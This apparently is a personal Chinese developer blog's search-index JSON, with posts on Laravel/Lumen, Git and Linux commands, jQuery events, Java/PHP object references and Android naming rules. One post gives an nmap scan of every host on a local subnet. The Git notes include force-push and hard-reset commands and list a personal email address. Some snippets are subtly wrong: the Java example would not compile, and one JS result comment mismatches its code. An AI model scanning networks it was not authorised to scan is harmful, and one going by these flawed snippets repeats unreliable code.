'key:generate'; /** * The console command description. * * @var string */ protected $description = \"Set the application key\"; /** * Execute the console command. * * @return void */ public function handle() &#123; $key = $this-&gt;getRandomKey(); if ($this-&gt;option('show')) &#123; $this-&gt;line('&lt;comment&gt;'.$key.'&lt;/comment&gt;'); return; &#125; $path = base_path('.env'); if (file_exists($path)) &#123; file_put_contents( $path, str_replace( 'APP_KEY=' . env('APP_KEY'), 'APP_KEY=' . $key, file_get_contents($path) ) ); &#125; $this-&gt;info(\"Application key [$key] set successfully.\"); &#125; /** * Generate a random key for the application. * * @return string */ protected function getRandomKey() &#123; return Str::random(32); &#125; /** * Get the console command options. * * @return array */ protected function getOptions() &#123; return array( array('show', null, InputOption::VALUE_NONE, 'Simply display the key instead of modifying files.'), ); &#125;&#125;","categories":[{"name":"PHP","slug":"PHP","permalink":"http://qwqaq.com/categories/PHP/"}],"tags":[{"name":"php","slug":"php","permalink":"http://qwqaq.com/tags/php/"},{"name":"lumen","slug":"lumen","permalink":"http://qwqaq.com/tags/lumen/"},{"name":"key:generate","slug":"key-generate","permalink":"http://qwqaq.com/tags/key-generate/"}]},{"title":"Laravel 5.6 资源任务编译器 laravel-mix webpack.mix.js 配置参考","slug":"Laravel-5-6-资源任务编译器-laravel-mix-webpack-mix-js-配置参考","date":"2018-05-31T12:52:34.000Z","updated":"2018-07-02T15:08:43.214Z","comments":true,"path":"4bba0df7.html","link":"","permalink":"http://qwqaq.com/4bba0df7.html","excerpt":"Laravel Mix provides a fluent API for defining Webpack build steps for your Laravel application using several common CSS and JavaScript pre-processors. Through simple method chaining, you can fluently define your asset pipeline.","text":"Laravel Mix provides a fluent API for defining Webpack build steps for your Laravel application using several common CSS and JavaScript pre-processors. Through simple method chaining, you can fluently define your asset pipeline. If you’ve ever been confused and overwhelmed about getting started with Webpack and asset compilation, you will love Laravel Mix. However, you are not required to use it while developing your application. Of course, you are free to use any asset pipeline tool you wish, or even none at all. Go to Laravel Documentation Codes1234567891011121314151617181920212223242526272829303132333435363738394041424344let mix = require('laravel-mix');/* |-------------------------------------------------------------------------- | Mix Asset Management |-------------------------------------------------------------------------- | | Mix provides a clean, fluent API for defining some Webpack build steps | for your Laravel application. By default, we are compiling the Sass | file for the application as well as bundling up all the JS files. | */const resPath = 'resources/assets';const distPath = 'public/dist';mix.setPublicPath(distPath) .js(`$&#123;resPath&#125;/js/app.js`, `$&#123;distPath&#125;/js`) .sass(`$&#123;resPath&#125;/sass/app.scss`, `$&#123;distPath&#125;/css`) .copyDirectory(`$&#123;resPath&#125;/images`, `$&#123;distPath&#125;/images`) .options(&#123; processCssUrls: false &#125;) .extract([ 'lodash', 'jquery', 'vue', 'vue-router', 'axios', 'bootstrap', 'bootstrap-vue' ]);// Source maps when not in production.if (!mix.config.production) &#123; // Debug 模式 mix.webpackConfig(&#123; devtool: \"inline-source-map\" &#125;) .sourceMaps(); // 加上后生成文件会很大 mix.disableNotifications();&#125;if (mix.config.production) &#123; mix.version();&#125;","categories":[{"name":"PHP","slug":"PHP","permalink":"http://qwqaq.com/categories/PHP/"}],"tags":[{"name":"Laravel","slug":"Laravel","permalink":"http://qwqaq.com/tags/Laravel/"},{"name":"laravel-mix","slug":"laravel-mix","permalink":"http://qwqaq.com/tags/laravel-mix/"},{"name":"webpack","slug":"webpack","permalink":"http://qwqaq.com/tags/webpack/"},{"name":"php","slug":"php","permalink":"http://qwqaq.com/tags/php/"},{"name":"js","slug":"js","permalink":"http://qwqaq.com/tags/js/"}]},{"title":"ThinkPad T430 Hackintosh 10.11 El Capitan","slug":"hackintosh-on-thinkpad-t430","date":"2018-03-14T13:11:55.000Z","updated":"2018-08-02T03:09:45.890Z","comments":true,"path":"85cde401.html","link":"","permalink":"http://qwqaq.com/85cde401.html","excerpt":"ThinkPad T430 i7 3635QM NVS5400M. Mini-DP work. Clover EFI bootloader.","text":"ThinkPad T430 i7 3635QM NVS5400M. Mini-DP work. Clover EFI bootloader. 附图一张： 传送到 GitHub","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[{"name":"10.13","slug":"10-13","permalink":"http://qwqaq.com/tags/10-13/"},{"name":"dp","slug":"dp","permalink":"http://qwqaq.com/tags/dp/"},{"name":"hackintosh","slug":"hackintosh","permalink":"http://qwqaq.com/tags/hackintosh/"},{"name":"hdmi","slug":"hdmi","permalink":"http://qwqaq.com/tags/hdmi/"},{"name":"minidp","slug":"minidp","permalink":"http://qwqaq.com/tags/minidp/"},{"name":"osx","slug":"osx","permalink":"http://qwqaq.com/tags/osx/"},{"name":"t430","slug":"t430","permalink":"http://qwqaq.com/tags/t430/"}]},{"title":"C# 可配合 Costura.Fody 使用的 SevenZipExtractor","slug":"CS-可配合-Costura-Fody-使用的-SevenZipExtractor","date":"2018-02-06T06:49:43.000Z","updated":"2018-12-01T14:32:33.594Z","comments":true,"path":"a68df31c.html","link":"","permalink":"http://qwqaq.com/a68df31c.html","excerpt":"SevenZipExtractor 可以很方便地拿 C# 调用 7z.dll 对文件进行解压缩，对于引用多出来的 .dll 文件，如果能将这一堆文件合并成一个，岂不是美滋滋？！最后，我找到了 Costura.Fody（一个可以将源 .dll 合并到目标 exe 中的引用）目录瞬间整洁无比哇~ 如题，本文将讲述 SevenZipExtractor + Costura.Fody 的具体配置操作。 C# SevenZipExtractor with Costura.Fody","text":"SevenZipExtractor 可以很方便地拿 C# 调用 7z.dll 对文件进行解压缩，对于引用多出来的 .dll 文件，如果能将这一堆文件合并成一个，岂不是美滋滋？！最后，我找到了 Costura.Fody（一个可以将源 .dll 合并到目标 exe 中的引用）目录瞬间整洁无比哇~ 如题，本文将讲述 SevenZipExtractor + Costura.Fody 的具体配置操作。 C# SevenZipExtractor with Costura.Fody 注：下文中的 A = 当前的 SevenZipExtractor 项目，B = 目标项目 将调用 SevenZipExtractor（已引用 Costura.Fody） 在此之前 B 先 NeGet 搜索引用 Costura.Fody，B 目录中将出现 FodyWeavers.xml git clone https://github.com/qwqcode/SevenZipExtractor 并打开解决方案，解决方案资源管理器 选中 SevenZipExtractor 右键 生成，SevenZipExtractor.dll 将会出现在 A/bin/Release/ 中 跳过此步骤，可直接下载 SevenZipExtractor.dll 复制 A 目录/bin/Release/SevenZipExtractor.dll 到 B 目录 中 B 中引用 SevenZipExtractor.dll 并配置 复制本地=False 如图 B 中创建目录 Costura32 和 Costura64 并将 A 目录/bin/Release/(x86|x64)/7z.dll 对应放入其中，对 .dll 文件进行配置 生成操作=嵌入的资源, 复制到输出目录=不复制 如图所示 配置 FodyWeavers.xml 123456&lt;Weavers&gt; &lt;Costura CreateTemporaryAssemblies='true' Unmanaged32Assemblies='7z|SevenZipExtractor' Unmanaged64Assemblies='7z|SevenZipExtractor' IncludeAssemblies='SevenZipExtractor'/&gt;&lt;/Weavers&gt; 好啦好啦 清理 再 生成 B 即可。现在就只有一个文件了，7z.dll 和 SevenZipExtractor.dll 都已嵌入单个 .exe 中","categories":[{"name":"CSharp","slug":"CSharp","permalink":"http://qwqaq.com/categories/CSharp/"}],"tags":[{"name":"CSharp","slug":"CSharp","permalink":"http://qwqaq.com/tags/CSharp/"},{"name":"Costura.Fody","slug":"Costura-Fody","permalink":"http://qwqaq.com/tags/Costura-Fody/"},{"name":"SevenZipExtractor","slug":"SevenZipExtractor","permalink":"http://qwqaq.com/tags/SevenZipExtractor/"},{"name":"7z.dll","slug":"7z-dll","permalink":"http://qwqaq.com/tags/7z-dll/"},{"name":"解压缩","slug":"解压缩","permalink":"http://qwqaq.com/tags/解压缩/"}]},{"title":"Git 命令笔记","slug":"git-命令笔记","date":"2018-01-28T14:16:15.000Z","updated":"2018-07-24T08:52:07.984Z","comments":true,"path":"77685bde.html","link":"","permalink":"http://qwqaq.com/77685bde.html","excerpt":"搜集 Git 的各种操作于此","text":"搜集 Git 的各种操作于此 12345678910111213141516171819202122232425262728293031git config user.emailgit config user.namegit config user.email Zneiatgit config user.email 1149527164@qq.comgit clone https://www.github.com/examplegit add .git commit -m 'MESSAGE'git push -u origin mastergit push --all --force origingit status# 删除两个 Commit（会删除文件）git reset --hard HEAD~2 git push --forcegit remote -vgit remote set-url origin git@github.com:example/example.gitgit pull# 团队协作git checkout zneiat-devgit fetchgit rebase origin/devgit push origin zneiat-dev","categories":[{"name":"开发工具","slug":"开发工具","permalink":"http://qwqaq.com/categories/开发工具/"},{"name":"Git","slug":"开发工具/Git","permalink":"http://qwqaq.com/categories/开发工具/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"http://qwqaq.com/tags/Git/"},{"name":"GitHub","slug":"GitHub","permalink":"http://qwqaq.com/tags/GitHub/"},{"name":"笔记","slug":"笔记","permalink":"http://qwqaq.com/tags/笔记/"}]},{"title":"Linux 命令笔记","slug":"Linux-命令笔记","date":"2018-01-27T11:59:59.000Z","updated":"2018-05-27T12:06:37.124Z","comments":true,"path":"1d50ddd6.html","link":"","permalink":"http://qwqaq.com/1d50ddd6.html","excerpt":"","text":"12345678910111213141516sudo nano /etc/php/7.0/fpm/pool.d/www.confsudo nano /etc/nginx/sites-available/defaultsudo nano /etc/nginx/nginx.confsudo /etc/init.d/nginx restartsudo /etc/init.d/php7.0-fpm restartsudo chmod 775 -R [FN]sudo chown -R root [FN]sudo chgrp -R root [FN]sudo vi /etc/php/7.0/fpm/pool.d/www.confschtasks /create /tn 任务名 /tr 执行命令 /sc minute /mo 1sudo nano /etc/php/7.0/fpm/php-fpm.confsudo nano /lib/systemd/system/php7.0-fpm.service","categories":[{"name":"Linux","slug":"Linux","permalink":"http://qwqaq.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://qwqaq.com/tags/Linux/"},{"name":"Bash","slug":"Bash","permalink":"http://qwqaq.com/tags/Bash/"},{"name":"Shell","slug":"Shell","permalink":"http://qwqaq.com/tags/Shell/"},{"name":"笔记","slug":"笔记","permalink":"http://qwqaq.com/tags/笔记/"}]},{"title":"项目 Pxtin 正在开发中...","slug":"项目-Pxtin-正在开发中","date":"2017-12-28T06:02:22.000Z","updated":"2018-07-02T15:27:27.734Z","comments":true,"path":"b5448812.html","link":"","permalink":"http://qwqaq.com/b5448812.html","excerpt":"12&gt; SiteName = 'Pxtin 图罐头'&gt; SiteDesc = '一个属于你的图片灵感库'","text":"12&gt; SiteName = 'Pxtin 图罐头'&gt; SiteDesc = '一个属于你的图片灵感库' Screenshots (2017-12-28)","categories":[{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/categories/项目/"}],"tags":[{"name":"Pxtin","slug":"Pxtin","permalink":"http://qwqaq.com/tags/Pxtin/"}]},{"title":"使用 nmap 扫描局域网下所有IP","slug":"使用-nmap-扫描局域网下所有ip","date":"2017-11-13T09:25:57.000Z","updated":"2018-04-22T06:45:54.738Z","comments":true,"path":"1a7ca83a.html","link":"","permalink":"http://qwqaq.com/1a7ca83a.html","excerpt":"","text":"12sudo apt install nmapsudo nmap -sP -PI -PT 192.168.1.0/24","categories":[{"name":"Linux","slug":"Linux","permalink":"http://qwqaq.com/categories/Linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://qwqaq.com/tags/linux/"},{"name":"nmap","slug":"nmap","permalink":"http://qwqaq.com/tags/nmap/"}]},{"title":"JS 复制变量值","slug":"js-复制变量值","date":"2017-11-05T12:38:02.000Z","updated":"2018-07-02T15:31:00.492Z","comments":true,"path":"27c9359e.html","link":"","permalink":"http://qwqaq.com/27c9359e.html","excerpt":"","text":"摘自《JavaScript高级程序设计》","categories":[{"name":"JS","slug":"JS","permalink":"http://qwqaq.com/categories/JS/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://qwqaq.com/tags/JavaScript/"}]},{"title":"JS 调用函数 得到对象 赋值","slug":"js-调用函数得到对象修改值","date":"2017-11-04T12:44:16.000Z","updated":"2018-08-29T15:53:16.030Z","comments":true,"path":"41a187b6.html","link":"","permalink":"http://qwqaq.com/41a187b6.html","excerpt":"","text":"12345var ha = &#123;t1: ['2', '3']&#125;;var get = function () &#123; return ha['t1']; &#125;;get()[0] = 'Yeah!';console.log(ha['t1']);// 结果：[\"Yhea!\", \"3\"]","categories":[{"name":"JS","slug":"JS","permalink":"http://qwqaq.com/categories/JS/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://qwqaq.com/tags/JavaScript/"},{"name":"面向对象","slug":"面向对象","permalink":"http://qwqaq.com/tags/面向对象/"}]},{"title":"jQuery: fire click() before blur() event","slug":"jquery-fire-click-before-blur-event","date":"2017-10-26T14:52:14.000Z","updated":"2019-01-28T14:15:57.400Z","comments":true,"path":"208e3be9.html","link":"","permalink":"http://qwqaq.com/208e3be9.html","excerpt":"解决 click 事件和 blur 事件被触发先后顺序问题。输入框自动补全功能的实现 (Select Components, Dropdown, Autocomplete)","text":"解决 click 事件和 blur 事件被触发先后顺序问题。输入框自动补全功能的实现 (Select Components, Dropdown, Autocomplete) QuestionI have an input field, where I try to make autocomplete suggestion. Code looks like 这里有一个 input，我想让这个 input 拥有 自动补全 (autocomplete) 功能。 12&lt;input type=\"text\" id=\"myinput\"&gt;&lt;div id=\"myresults\"&gt;&lt;/div&gt; On input’s blur() event I want to hide results’ div: 当 input 的 blur() 事件触发时，我想执行隐藏 自动补全候选结果 的 div： 123$(\"#myinput\").live('blur',function()&#123; $(\"#myresults\").hide();&#125;); When I write something into my input I send request to server and get json response, parse it into ul-&gt;li structure and put this ul to my #myresults div. 当我输入了一些东西到 input 里，JS 会请求服务器并获取 json 响应数据，并将其解析成 ul-&gt;li 的结构，放入 #myresults div 中。 When I click to this parsed li element I want to set value from li to input and hide #myresults div 当我点击 li 元素时，我想根据 li 来设置 input 的值，并且隐藏 #myresults div 1234$(\"#myresults ul li\").live('click',function()&#123; $(\"#myinput\").val($(this).html()); $(\"#myresults\").hide();&#125;); Everything is going good, but when I click to my li blur() event fires before click() and input’s value don’t get li’s html. 但是当我点击 li 元素时，blur() 事件比 click() 事件先被触发，所以没办法获取 li 的值并填入 input。 How can I set up click() event before blur()? 怎么才能让 click() 事件比 blur() 先被触发？ AnswerSolution 1Listen to mousedown instead of click. 监听 mousedown 事件，而不是 click The mousedown and blur events occur one after another when you press the mouse button, but click only occurs when you release it. 当您按下鼠标时，mousedown 和 blur 事件会一个接一个地被触发，但 click 事件只有在释放鼠标时它才会被触发。 Solution 2You can preventDefault() in mousedown to block the dropdown from stealing focus. The slight advantage is that the value will be selected when the mouse button is released, which is how native select components work. 你可以在 mousedown 中使用 preventDefault() 来阻止 dropdown 获取焦点。 这样做微小的优势是，当鼠标按键释放时，值就能被选中，原生的 Select Components 就是这样工作的。 12345$('input').on('focus', function() &#123; $('ul').show();&#125;).on('blur', function() &#123; $('ul').hide();&#125;); 12345$('ul').on('mousedown', function(event) &#123; event.preventDefault();&#125;).on('click', 'li', function() &#123; $('input').val(this.textContent).blur();&#125;); StackOverflow","categories":[{"name":"前端","slug":"前端","permalink":"http://qwqaq.com/categories/前端/"},{"name":"jQuery","slug":"前端/jQuery","permalink":"http://qwqaq.com/categories/前端/jQuery/"}],"tags":[]},{"title":"类中的静态变量赋值和调用","slug":"类中的静态变量赋值和调用","date":"2017-09-17T05:43:38.000Z","updated":"2019-01-28T14:15:57.425Z","comments":true,"path":"78f87e97.html","link":"","permalink":"http://qwqaq.com/78f87e97.html","excerpt":"静态变量（Static Variable）在计算机编程领域指在程序执行前系统就为之静态分配（也即在运行时中不再改变分配情况）存储空间的一类变量。与之相对应的是在运行时只暂时存在的自动变量（即局部变量）与以动态分配方式获取存储空间的一些对象，其中自动变量的存储空间在调用栈上分配与释放。 Wikipedia","text":"静态变量（Static Variable）在计算机编程领域指在程序执行前系统就为之静态分配（也即在运行时中不再改变分配情况）存储空间的一类变量。与之相对应的是在运行时只暂时存在的自动变量（即局部变量）与以动态分配方式获取存储空间的一些对象，其中自动变量的存储空间在调用栈上分配与释放。 Wikipedia Java 中被 static 修饰的成员称为静态成员或类成员。它属于整个类所有，而不是某个对象所有，即被类的所有对象所共享。静态成员可以使用类名直接访问，也可以使用对象名进行访问。 参考：csdn Java12345678910111213141516171819202122232425262728293031323334353637383940public class test &#123; public static void main(String[] agrs) &#123; new a(); b classB = new b(); classB.init(); classB.action(); c classC = new c(); classC.cAction(); &#125; public static class a &#123; public static String[] ha = new String[2]; &#125; public static class b &#123; private String mHa; public void init() &#123; this.mHa = a.ha; this.mHa[0] = \"NONE0\"; this.mHa[1] = \"NONE1\"; &#125; public void action() &#123; this.mHa[0] = \"Hello0\"; this.mHa[1] = \"Hello1\"; &#125; &#125; public static class c &#123; public void cAction() &#123; for (String item : a.ha) &#123; System.out.println(item + \"\\n\"); &#125; &#125; &#125;&#125;// 结果为// Hello0// Hello1 123456789101112131415161718public class test &#123; public static void main(String[] agrs) &#123; a First = new a(); First.one = \"ha\"; First.two = \"hahaha\"; First.three = \"Emmm...\"; a Second = First; Second.one = \"Cry...\"; System.out.println(First.one); &#125; public static class a &#123; public String one; public String two; public String three; &#125;&#125;// 结果为 \"Cry...\" PHP1234567891011121314151617&lt;?phpclass a &#123; public $one; public $two; public $three;&#125;$First = new a();$First-&gt;one = \"ha\";$First-&gt;two = \"hahaha\";$First-&gt;three = \"emmmmm.....\";$Second = $First;$Second-&gt;one = \"cry...\";echo $First-&gt;one;// 结果为 \"cry...\"","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://qwqaq.com/tags/面向对象/"},{"name":"静态变量","slug":"静态变量","permalink":"http://qwqaq.com/tags/静态变量/"}]},{"title":"Android 命名规则","slug":"android-命名规则","date":"2017-09-17T02:45:15.000Z","updated":"2019-01-28T14:15:57.392Z","comments":true,"path":"d3744f0c.html","link":"","permalink":"http://qwqaq.com/d3744f0c.html","excerpt":"常用的 Android 命名规则","text":"常用的 Android 命名规则 命名规则包名 包名 此包中包含 com.xx.应用名称缩写.activity 页面用到的Activity类 (activitie层级名用户界面层) com.xx.应用名称缩写.fragment 页面用到的fragment com.xx.应用名称缩写.base 基础共享的类 com.xx.应用名称缩写.config 通用的配置 com.xx.应用名称缩写.global 全局的监听实现类等 com.xx.应用名称缩写.adapter 页面用到的Adapter类 (适配器的类) com.xx.应用名称缩写.util 此包中包含：公共工具方法类（util模块名）命名与第三方的utils作区分 com.xx.应用名称缩写.bean 下面可分：vo(本地类)、bo（远程类）、dto（传递引用类） com.xx.应用名称缩写.model 此包中包含：模型类 com.xx.应用名称缩写.db 数据库操作类 com.xx.应用名称缩写.view 自定义的View类等，可通用，与app业务无关的 com.xx.应用名称缩写.widget 自定义的View类等，与app业务相关的 com.xx.应用名称缩写.service Service服务，后台服务 com.xx.应用名称缩写.receiver BroadcastReceiver服务，接收通知 类名 类 描述 例如 Activity 类 Activity为后缀标识 欢迎页面类WelcomeActivity Adapter类 Adapter 为后缀标识 新闻详情适配器 NewDetailAdapter 解析类 Parser为后缀标识 首页解析类HomePosterParser 工具方法类 Util或Manager为后缀标识（与系统或第三方的Utils区分）或功能+Util 日志工具类： LogUtil（Logger也可）打印工具类：PrinterUtil 管理类 Manager为后缀标识 ThreadPoolManager 数据库类 以DBHelper后缀标识 新闻数据库：NewDBHelper Service类 以Service为后缀标识 时间服务TimeServiceBroadcast Receiver类 以Receiver为后缀标识 推送接收JPushReceiver ContentProvider 以Provider为后缀标识 自定义基类 以Base开头 BaseActivity,BaseFragment 实体类 模块 + 类型 + 后缀(BO/VO/DTO) 例如：订单详情实体类及订单详情内的商品实体类 OrderDetailBO、OrderGoodsBO；例如：订单列表实体类及订单列表内的商品实体类 OrderBO/OrderItemBO、OrderGoodsBO/OrderItemGoodsBO；当然，如果订单详情和订单列表内的OrderGoodsBO一致，则可以单独提出来给2个实体类通用 自定义view 功能描述 + View 例如：可以展开收缩的view，CollapsibleView 自定义widget 模块名 + 类型(List/Info) + Widget 例如：订单详情内的商品列表，OrderDetailGoodsListWidget； 或者：在widget内新增order目录，放order目录下的GoodsListWidget 接口名 回调事件监听接口 On + 对象 + Click/Select，例如：OnItemClick/OnMenuSelect 其他接口 功能描述 + Impl 方法名 方法 说明 initXX() 初始化相关方法,使用init为前缀标识，如初始化布局initView() isXX() checkXX() 方法返回值为boolean型的请使用is或check为前缀标识 getXX() 返回某个值的方法，使用get为前缀标识 handleXX() 对数据进行处理的方法，尽量使用handle为前缀标识 displayXX()/showXX() 弹出提示框和提示信息，使用display/show为前缀标识 saveXX() 与保存数据相关的，使用save为前缀标识 resetXX() 对数据重组的，使用reset前缀标识 clearXX() 清除数据相关的 removeXXX() 清除数据相关的 drawXXX() 绘制数据或效果相关的，使用draw前缀标识 类的属性命名1.常量名 常量名命名模式为CONSTANT_CASE，全部字母大写，用下划线分隔单词 常量一般统一放置在config目录下的AppConfig文件内 同类型的常量，通常放置在同一个内部类中 示例参考 com.xiaoq.sample.mylib.code包下面的Appconfig 2.非常量字段名 非公有，非静态字段命名以m开头。int mPackagePrivate;private int mPrivate;protected int mProtected; 静态字段命名以s开头。private static MyClass sSingleton; 公有非静态字段命名以p开头。public int pField; 公有静态字段（全局变量）命名以g开头。public static int gField; UI控件变量命名参考 附录的 UI控件缩写表 3.量词变量后缀 First 一组变量中的第一个 Last 一组变量中的最后一个 Next 一组变量中的下一个变量 Prev 一组变量中的上一个 Cur 一组变量中的当前变量。 例如：mCustomerStrFirst mCustomerStrLast 4.集合添加如下后缀：List、Map、Set5.数组添加如下后缀：Arr6.临时变量 临时变量通常被取名为i，j，k，m和n，它们一般用于整型； c，d，e，它们一般用于字符型； 资源文件命名规范1.资源布局文件（XML文件（layout布局文件））： activity_main.xml frament_main.xml Dialog命名：dialog_描述.xml，例如：dialog_hint.xml PopupWindow命名：ppw_描述.xml，例如：ppw_info.xml 列表项命名：item_描述.xml 通用列表项：item_city.xml listview：list_item_city.xml gridview：grid_item_city.xml recyclerview：recycler_item_city.xml 自定义类似listview：TabLayout：tab_item_city.xml 包含项命名：模块_(位置).xml 位置：top、 btm、 left、 right 例如：activity_main_btm.xml、fragment_main_top.xml 通用的包含项命名采用：base_(位置)_项目名称缩写_描述.xml 描述：title、 content、 header、 footer 例如：base_top_xxxx_title.xml、base_btm_xxxx_header.xml 例如：全项目通用 base_top.xml base_btm.xml 自定义Widget（布局命名） widget_ + View功能描述/模块 + 类型(list/info) + .xml 例如:订单详情内的商品列表 widget_order_detail_goods_list.xml 特殊自定义组件/控件 例如: com.xiaoq.widget.tips.TipsManager的loading布局/empty布局/重试布局 通用：base_tips_loading.xml、base_tips_empty、base_tips_retry 各个activity内：activity_描述_tips_loading.xml、activity_main_tips_loading.xml fragment：fragment_main_tips_loading.xml view：activity_main_xxx_view_tips_loading.xml、fragment_main_xxx_view_tips_loading.xml，xxx 为view的描述 2.资源文件（图片mipmap及drawable文件夹下）： 全部小写，采用下划线命名法，加前缀区分 通用规则 名称 功能 bg_head 背景图片使用bg_功能_说明 def_search_cell 默认图片使用def_功能_说明 ic_more_help 图标图片使用ic_功能_说明 seg_list_line 具有分隔特征的图片使用seg_功能_说明 (false)不可用效果 sel_ok 选择图标使用sel_功能_说明 命名模式：可加后缀 _small 表示小图, _big 表示大图，逻辑名称可由多个单词加下划线组成 采用以下规则： 用途_模块名_逻辑名称 用途_模块名_颜色 用途_逻辑名称 用途_颜色 说明：用途也指控件类型（具体见UI控件缩写表） 例如： btn_main_home.png 按键 divider_maket_white.png 分割线 btn_red.png 红色按键 btn_red_big.png 红色大按键 divider_white.png 白色分割线 如果有多种形态如按钮等除外如 btn_xx.xml（selector） normal、pressed、disbled、checked 较常用 名称 功能 btn_xx 按钮图片使用btn_整体效果（selector） btn_xx_normal 按钮图片使用btn_正常情况效果 btn_xx_pressed 按钮图片使用btn_点击时候效果 btn_xx_focused state_focused聚焦效果 btn_xx_disabled state_enabled (false)不可用效果 btn_xx_checked state_checked选中效果 btn_xx_selected state_selected选中效果 btn_xx_hovered state_hovered悬停效果 btn_xx_checkable state_checkable可选效果 btn_xx_activated state_activated激活的 btn_xx_windowfocused state_window_focused 3.动画文件（anim文件夹下）： 全部小写，采用下划线命名法，加前缀区分。 具体动画采用以下 规则：模块名_逻辑名称 例如： * `refresh_progress.xml` market_cart_add.xml market_cart_remove.xml 普通的tween动画采用如下表格中的命名方式，前面为动画的类型，后面为方向 动画命名例子 规范写法 fade_in 淡入 fade_out 淡出 push_down_in 从下方推入 push_down_out 从下方推出 push_left 推向左方 slide_in_from_top 从头部滑动进入 zoom_enter 变形进入 slide_in 滑动进入 shrink_to_middle 中间缩小 4.styles.xml文件的命名 规则：模块名+逻辑名称 main_tabBottom order_detail_goodsItem order_list_goodsImg 5. layout中的id命名 命名模式为：View缩写_view的逻辑名称，可以使用AndroidStudio的插件Android Studio Prettify 自动生成findViewById 例如：tv_Sender_Mobile（展示联系人手机的TextView） 可参考 com.xiaoq.sample.mylib.code.CodeActivity 当然，全部小写的命名是最标准的，不过为了要适应Prettify插件自动生成满足要求的局部变量，调整为小驼峰命名法，并用下划线分割 附录注意其他未在文档内标准的规范则以AndroidStudio自动生成的为准 UI控件缩写表 控件 缩写 例子 LinearLayout ll llFriend或者mFriendLL RelativeLayout rl rlMessage或mMessageRL FrameLayout fl flCart或mCartFL TableLayout tl tlTab或mTabTL Button btn btnHome或mHomeBtn ImageButton ibtn btnPlay或mPlayIBtn TextView tv tvName或mNameTV EditText et etName或mNameET ListView lv lvCart或mCartLV ImageView iv ivHead或mHeadIV GridView gv gvPhoto或mPhotoGV 常见英文单词缩写 名称 缩写 icon ic （主要用在app的图标） color cl（主要用于颜色值） divider di（主要用于分隔线，不仅包括Listview中的divider，还包括普通布局中的线） selector sl（主要用于某一view多种状态，不仅包括Listview中的selector，还包括按钮的selector） average avg background bg（主要用于布局和子布局的背景） buffer buf 缓冲 control ctrl delete del document doc error err escape esc increment inc 增量 infomation info initial init image img Internationalization I18N 国际化 length len library lib message msg password pwd position pos server srv string str temp tmp window wnd(win) 本文来自互联网","categories":[{"name":"Android","slug":"Android","permalink":"http://qwqaq.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://qwqaq.com/tags/Android/"},{"name":"命名规则","slug":"命名规则","permalink":"http://qwqaq.com/tags/命名规则/"},{"name":"代码规范","slug":"代码规范","permalink":"http://qwqaq.com/tags/代码规范/"}]},{"title":"Android RecyclerView Item 点击/长按 事件","slug":"android-recyclerview-item-点击长按-事件","date":"2017-09-16T09:20:03.000Z","updated":"2018-07-02T15:07:24.513Z","comments":true,"path":"8bb3c5eb.html","link":"","permalink":"http://qwqaq.com/8bb3c5eb.html","excerpt":"Android 列表控件 RecyclerView 在实例化 Adapter 类前写 Item 的 点击/长按 事件逻辑","text":"Android 列表控件 RecyclerView 在实例化 Adapter 类前写 Item 的 点击/长按 事件逻辑 MainActivity.java12345678910111213141516171819202122ScheduleView mRecyclerView;private void initView()&#123; mRecyclerView = findViewById(R.id.schedule); // 项目点击监听 ScheduleAdapter.ItemClickListener itemClickListener = new ScheduleAdapter.ItemClickListener() &#123; @Override public void onItemClick(View itemView) &#123; // 点击 &#125; @Override public void onItemLong(View itemView) &#123; // 长按 &#125; &#125;; mAdapter = new ScheduleAdapter(itemClickListener); mRecyclerView.setAdapter(mAdapter); // adapter 应用到 RecyclerView&#125; ScheduleAdapter.java1234567891011121314151617181920212223242526272829303132333435363738public class ScheduleAdapter extends RecyclerView.Adapter&lt;ScheduleAdapter.ViewHolder&gt;&#123; private ItemClickListener mItemClickListener; public ScheduleAdapter(ItemClickListener itemClickListener) &#123; mItemClickListener = itemClickListener; &#125; @Override public void onBindViewHolder(ViewHolder holder, int position) &#123; if (!holder.itemView.hasOnClickListeners()) &#123; holder.itemView.setOnClickListener(mItemClickListener); holder.itemView.setOnLongClickListener(mItemClickListener); &#125; &#125; /** * 点击监听 */ public static class ItemClickListener implements View.OnClickListener, View.OnLongClickListener &#123; public void onClick(View v) &#123;&#125; public boolean onLongClick(View v) &#123; return true; &#125; &#125; /** * View Holder */ public static class ViewHolder extends RecyclerView.ViewHolder &#123; public View itemView; ViewHolder(View view) &#123; super(view); itemView = view; &#125; &#125; // ...&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://qwqaq.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://qwqaq.com/tags/Android/"},{"name":"事件监听","slug":"事件监听","permalink":"http://qwqaq.com/tags/事件监听/"},{"name":"RecyclerView","slug":"RecyclerView","permalink":"http://qwqaq.com/tags/RecyclerView/"},{"name":"OnClickListener","slug":"OnClickListener","permalink":"http://qwqaq.com/tags/OnClickListener/"},{"name":"OnLongClickListener","slug":"OnLongClickListener","permalink":"http://qwqaq.com/tags/OnLongClickListener/"},{"name":"ViewHolder","slug":"ViewHolder","permalink":"http://qwqaq.com/tags/ViewHolder/"}]},{"title":"时光笔记 COMING SOON","slug":"时光笔记-COMING-SOON","date":"2017-08-18T13:46:40.000Z","updated":"2018-07-02T15:26:08.510Z","comments":true,"path":"ba7ff378.html","link":"","permalink":"http://qwqaq.com/ba7ff378.html","excerpt":"记录点滴，留住感动","text":"记录点滴，留住感动 Screenshots (2017-08-18)","categories":[{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/categories/项目/"}],"tags":[{"name":"TimeNote","slug":"TimeNote","permalink":"http://qwqaq.com/tags/TimeNote/"},{"name":"时光笔记","slug":"时光笔记","permalink":"http://qwqaq.com/tags/时光笔记/"}]},{"title":"Linux 文件权限","slug":"linux-文件权限","date":"2017-08-15T07:19:08.000Z","updated":"2019-01-28T14:15:57.409Z","comments":true,"path":"48844841.html","link":"","permalink":"http://qwqaq.com/48844841.html","excerpt":"Linux 的权限分为 r w x 三种：r 